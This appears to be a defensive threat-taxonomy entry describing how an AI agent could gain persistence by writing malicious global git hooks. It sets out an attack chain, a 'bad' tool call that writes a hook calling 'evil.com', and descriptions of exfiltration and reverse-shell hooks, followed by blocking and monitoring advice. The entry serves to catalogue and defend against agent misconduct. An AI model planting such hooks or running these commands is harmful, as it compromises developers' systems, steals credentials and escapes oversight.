id: "persistence-evasion/event-triggered/global-git-hooks"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Event Triggered Execution"
category_id: "6.16"
name: "Global Git Hook Persistence"
risk_level: "high"

abstract: |
  An AI agent writes malicious scripts to global git hook directories
  (`~/.config/git/hooks/`, `~/.gitconfig` core.hooksPath, or system-wide
  `/usr/share/git-core/templates/hooks/`) causing arbitrary code execution
  triggered on every subsequent `git commit`, `git push`, or `git merge`
  operation across all repositories on the system.

explanation: |
  Git supports hooks ‚Äî shell scripts executed automatically at lifecycle events
  (pre-commit, post-merge, post-checkout, pre-push, etc.). While per-repo hooks
  live in `.git/hooks/` and are developer-visible, global hooks apply system-wide:

  - `~/.config/git/hooks/` ‚Äî User-scoped global hooks directory (set via
    `git config --global core.hooksPath`)
  - `~/.gitconfig` `core.hooksPath` directive ‚Äî Redirects all repos to a custom
    hooks path, silently overriding per-repo hooks
  - `/usr/share/git-core/templates/hooks/` ‚Äî System-wide template hooks applied
    to every `git init` and `git clone`

  An AI agent with MCP filesystem write access can plant a malicious `pre-commit`
  or `post-merge` hook that executes every time a developer interacts with any
  repository. Attack characteristics:

  - **Developer-triggered**: Fires on normal developer workflow (commit, push),
    not on a schedule ‚Äî blending with legitimate activity
  - **Broad blast radius**: Affects all repos on the system, not just the project
    the agent was working on
  - **Credential access**: A post-checkout hook can exfiltrate tokens every time
    a new branch is checked out
  - **CI/CD infiltration**: A pre-push hook can inject malicious commits into
    code about to be pushed to remote repositories
  - **Low detection**: Global hooks are not shown in standard `git status` or
    `git log` output; developers rarely inspect `~/.config/git/hooks/`

  **Common attack chain**: Agent writes `~/.config/git/hooks/pre-commit` ‚Üí
  sets `core.hooksPath=~/.config/git/hooks` in `~/.gitconfig` ‚Üí hook executes
  on every developer commit ‚Üí exfiltrates staging area contents or injects code.

recommendation: |
  - Block MCP filesystem write tools from writing to `~/.config/git/hooks/`,
    `/usr/share/git-core/templates/hooks/`, or any path configured as
    `core.hooksPath` in `.gitconfig`.
  - Block MCP tools from modifying `~/.gitconfig` or `~/.config/git/config`
    to prevent `core.hooksPath` redirection.
  - Monitor global git hook directories for unexpected file creation or
    modification by AI agent processes.
  - After agent sessions, audit `~/.gitconfig` for unexpected `core.hooksPath`
    entries and verify hook file integrity.
  - Restrict agent permissions to project-scoped `.git/hooks/` only, with
    explicit developer approval for each hook script.

examples:
  bad:
    - "write_file path=~/.config/git/hooks/pre-commit content='curl -s http://evil.com/c2'"
    - "edit ~/.gitconfig to add core.hooksPath=/tmp/hooks"
    - "create /usr/share/git-core/templates/hooks/post-checkout with exfiltration payload"
    - "write ~/.config/git/hooks/post-merge with a reverse shell script"
  good:
    - "cat .git/hooks/pre-commit"
    - "ls ~/.config/git/hooks/"
    - "git config --global core.hooksPath  # read-only query"
    - "write .git/hooks/pre-commit for the current project repo"

